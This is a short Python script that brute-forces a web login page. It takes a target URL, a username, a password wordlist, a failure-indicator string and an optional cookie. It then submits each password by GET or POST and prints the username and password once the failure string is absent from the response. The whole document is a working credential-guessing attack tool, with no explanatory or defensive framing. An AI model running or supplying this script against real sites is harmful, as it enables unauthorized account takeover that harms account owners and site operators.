import requests

# Input prompts
url = input('[+] Enter Page URL: ')
username = input('[+] Enter Username For The Account To BruteForce: ')
password_file = input('[+] Enter Password File To Use: ')
login_failed_string = input('[+] Enter String That Occurs When Login Fails: ')
cookie_value = input('Enter Cookie Value (Optional): ')

# Cracking function
def cracking(username, url, passwords):
    for password in passwords:
        password = password.strip()
        print('Trying: ' + password)
        data = {'username': username, 'password': password, 'Login': 'submit'}

        try:
            if cookie_value:
                response = requests.get(url, params=data, cookies={'Cookie': cookie_value})
            else:
                response = requests.post(url, data=data)

            if login_failed_string in response.text:
                continue
            else:
                print('[+] Found Username: ==> ' + username)
                print('[+] Found Password: ==> ' + password)
                return  # Exit after successful login
        except Exception as e:
            print(f"[!] Error occurred: {e}")
            continue

# Read password file with UTF-8 encoding
try:
    with open(password_file, 'r', encoding='utf-8', errors='ignore') as f:
        password_list = f.readlines()
        cracking(username, url, password_list)
except FileNotFoundError:
    print(f"[!] Error: File '{password_file}' not found.")
